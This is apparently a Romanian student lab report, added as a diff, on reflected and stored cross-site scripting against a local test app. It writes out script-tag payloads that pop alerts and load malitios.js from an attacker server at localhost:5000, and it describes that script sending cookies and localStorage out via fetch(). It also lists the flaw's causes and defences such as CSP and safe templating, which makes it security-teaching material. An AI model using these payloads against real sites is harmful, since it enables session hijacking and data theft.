@@ -1,0 +1,53 @@
+LAB 06 – XSS non-persistent
+
+1. Payload XSS simplu (alert)
+
+URL: http://localhost:3000/cauta?q=<script>alert('atac XSS')</script>
+
+La accesarea URL-ului, browserul executa cod JavaScript injectat si afiseaza un alert. Acest lucru demonstreaza existenta unei vulnerabilitati XSS non-persistente.
+
+
+2. Payload XSS cu incarcare script extern (server atacator)
+
+URL: http://localhost:3000/cauta?q=<script src="http://localhost:5000/static/malitios.js"></script>
+
+Browserul victimei incarca si executa fisierul JavaScript malitios de pe serverul atacatorului (localhost:5000).
+
+
+3. Payload pentru exfiltrarea datelor victimei
+
+Cod JavaScript (malitios.js):
+- citeste document.cookie
+- citeste localStorage
+- trimite datele prin fetch() catre serverul atacatorului (printr-o cerere AJAX)
+
+Serverul atacatorului primeste:
+- cookie-urile victimei
+- date din localStorage
+- user agent
+- URL-ul paginii compromise
+
+
+In cadrul laboratorului, vulnerabilitatea (atacul XSS non-persistent) a fost exploatata prin parametrul q al resursei /cauta,
+unde valoarea primita de la utilizator a fost afisata direct in pagina HTML fara nicio validare sau sanitizare.
+
+Motive pentru care atacul a avut succes:
+    - valoarea parametrului q este afisata direct in pagina fara sanitizare
+    - browserul interpreteaza continutul injectat ca fiind cod JS validare
+    - nu exista mecanisme de validare a caracterelor speciale
+    - nu sunt aplicate politici de securitate
+
+Metode de securizare a app web:
+    - validarea stricta a inputului
+    - implementarea CSP (Content Security Policy)
+    - folosirea mecanismelor de templating sigure
+    - evitarea afisarii inputului
+    - gestionarea automata a sanitizarii datelor
+
+
+
+Lab07 - XSS persistent
+
+Am testat functionalitatea XSS-ului cu: 
+    atacator<script>alert('XSS PERSISTENT')</script>
+    anamaria<script src="http://localhost:5000/static/script.js"></script>
